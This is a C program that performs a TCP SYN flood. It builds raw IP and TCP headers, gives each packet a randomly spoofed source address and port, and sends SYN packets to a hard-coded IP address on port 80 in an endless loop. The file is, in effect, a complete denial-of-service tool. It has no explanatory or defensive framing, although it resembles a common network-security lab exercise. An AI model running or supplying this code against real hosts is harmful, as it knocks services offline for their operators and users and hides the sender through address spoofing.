#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define DEST_IP "158.69.72.221"
#define DEST_PORT 80
#define PACKET_LEN 1500

/* TCP Header */
struct tcpheader {
	u_short tcp_sport;
	u_short tcp_dport;
	u_int tcp_seq;
	u_int tcp_ack;
	u_char tcp_offx2;
#define TH_OFF(th) (((th) -> tcp_offx2 & 0xf0) >> 4)
u_char tcp_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_ URG | TH_ ECE | TH_CWR )
u_short tcp_win;
u_short tcp_sum;
u_short tcp_urp;
};

struct pseudo_tcp
{
	unsigned saddr, daddr;
	unsigned char mbz;
	unsigned char ptcl;
	unsigned short tcpl;
	struct tcpheader tcp;
	char payload[1500];
};

struct ipheader {
	unsigned char iph_ihl:4,
		      iph_ver:4;
	unsigned char iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned short int iph_flag:3,
			   iph_offset:13;
	unsigned char iph_ttl;
	unsigned char iph_protocol;
	unsigned short int iph_chksum;
	struct in_addr iph_sourceip;
	struct in_addr iph_destip;
};


unsigned short in_cksum(unsigned short *buf, int length){
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;
	while(nleft > 1){
		sum += *w++;
		nleft -= 2;
	}
	if(nleft == 1){
		*(u_char *)(&temp) = *(u_char *)w;
		sum += temp;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

unsigned short calculate_tcp_checksum(struct ipheader *ip){
	struct tcpheader *tcp = (struct tcpheader *) ((u_char *)ip + sizeof(struct ipheader));
	int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

	struct pseudo_tcp p_tcp;
	memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

	p_tcp.saddr = ip->iph_sourceip.s_addr;
	p_tcp.daddr = ip->iph_destip.s_addr;
	p_tcp.mbz = 0;
	p_tcp.ptcl = IPPROTO_TCP;
	p_tcp.tcpl = htons(tcp_len);
	memcpy(&p_tcp.tcp, tcp, tcp_len);

	return (unsigned short) in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
}

void send_raw_ip_packet(struct ipheader* ip){
	struct sockaddr_in dest_info;
	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}

int main(){
	char buffer[PACKET_LEN];
	struct ipheader *ip = (struct ipheader *) buffer;
	struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
	srand(time(0));
	while(1) {
		memset(buffer, 0, PACKET_LEN);
		tcp->tcp_sport = rand();
		tcp->tcp_dport =  htons(DEST_PORT);
		tcp->tcp_seq = rand();
		tcp->tcp_offx2 = 0x50;
		tcp->tcp_flags = TH_SYN;
		tcp->tcp_win = htons(20000);
		tcp->tcp_sum = 0;

		ip->iph_ver = 4;
		ip->iph_ihl = 5;
		ip->iph_ttl = 50;
		ip->iph_sourceip.s_addr = rand();
		ip->iph_destip.s_addr = inet_addr(DEST_IP);
		ip->iph_protocol = IPPROTO_TCP;
		ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
		tcp->tcp_sum = calculate_tcp_checksum(ip);

		send_raw_ip_packet(ip);
	}
	return 0;
}



